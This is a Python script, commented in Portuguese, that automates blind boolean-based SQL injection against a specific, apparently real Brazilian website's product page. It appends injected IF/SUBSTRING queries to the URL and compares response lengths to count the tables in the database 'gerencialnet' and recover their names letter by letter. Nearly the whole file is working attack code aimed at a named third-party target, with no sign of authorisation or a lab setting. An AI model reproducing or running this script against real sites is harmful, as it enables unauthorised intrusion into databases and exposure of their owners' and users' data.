# ---------- * imports * ----------
import requests

# ---------- * constants * ----------

LETRAS = ["A", "E", "O", "S", "R", "I", "N", "D", "M", "U",
            "T", "C", "L", "P", "V", "G", "H", "Q", "B", "F",
            "Z", "J", "X", "K", "W", "Y", "_", "-", ".", "0", "1",
            "2", "3", "4", "5", "6", "7", "8", "9", ":", "?",
            "@", "!", "#", "$", "%", "&", "*", "(", ")",
            "+", "="]

URL = "https://www.adtecnet.com.br/produto.php?id=19"
DB_NAME = "gerencialnet"

# ---------- * functions * ----------

# def get_request(query): 
#     new_url = URL + query
#     response = requests.get(new_url) # .. make request ..
#     content = response.content # .. gets request content ..
#     content_length_new = len(content) # .. gets request content length ..

#     return content_length_new

# .. find qty of tables
def tbQtd(content_length):
    i = 1
    content_length_new = 0

    while True:
        new_url = URL + f"%20and%20IF((select%20count(*)%20from%20information_schema.tables%20where%20table_schema%20=%20%27{DB_NAME}%27)={i},1,NULL)" # .. sets query ..
        response = requests.get(new_url) # .. make request ..
        content = response.content # .. gets request content ..
        content_length_new = len(content) # .. gets request content length ..

        # .. verifies if query returns true by comparing request content length ..
        if content_length_new != content_length:
            i += 1
        else:
            break

    return i

# .. find table's names
def tbContent(URL, DB_NAME, content_length, LETRAS, qtd_tables):
    array_tables = []
    k = 1
    l = 0
    limit = "1"

    # .. pass throught all tables
    while k < qtd_tables:
        i = 1
        j = 0
        tables = []

        while True:
            new_url = URL + f"%20and%20IF(SUBSTRING((SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%27{DB_NAME}%27%20LIMIT%20{limit}),%20{i},%201)%20=%20%27{LETRAS[j]}%27,%201,%20NULL)" # .. sets query ..
            response = requests.get(new_url) # .. make request ..
            content = response.content # .. gets request content ..
            content_length_new = len(content) # .. gets request content length ..
                
            # .. if query returns true, meaning letter is in table name ..
            if content_length_new == content_length:
                tables.append(LETRAS[j]) # .. keeps letter found in array ..
                print(tables)

                table_name = "".join(tables) # .. turns array into string ..
                query = URL + f"%20and%20IF((SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%27{DB_NAME}%27%20LIMIT%20{limit})=%27{table_name}%27,%201,%20NULL)" # .. sets query ..

                response = requests.get(query) # .. make request ..
                content = response.content # .. gets request content ..
                content_length_new = len(content) # .. gets request content length ..

                # .. if query returns true, meaning table name was found ..
                if content_length_new == content_length:
                    print(f"nome table: {table_name}")

                    array_tables.append(table_name)
                    print("number of tables: " + str(len(array_tables) + 1))

                    k += 1 # .. changes limit to get to table number ..
                    limit = f"{k}, 1"
                    break

                # .. if query returns false,  ..
                else:     
                    i += 1 # .. change query to verify next letter ..
                    j = 0 # .. resets letter array to start at letter A ..
            
            # .. if query returns false, tries next letter ..
            else:
                j += 1
                print("...\r")

    return array_tables


if __name__ == '__main__':

    # .. verifies if url is valid ..
    if '=' in URL:
        print("Começando o Scanning.")
    else:
        print("Verifique se a URL contem o motedo GET.")

    response = requests.get(URL) # .. makes request on pure url ..

    # .. if its up ..
    if response.status_code == 200:
            content = response.content # .. gets request content ..
            content_length = len(content) # .. gets request content length ..
            print(f"content {content_length}")
            
            qtd_tables = tbQtd(content_length) # .. gets qty of tables ..
            
            tb_name = tbContent(URL, DB_NAME, content_length, LETRAS, qtd_tables) # .. gets table's names ..
            print(f"Nome das tabelas: {tb_name}")
            
    else:
        print("O servidor não respondeu :(")
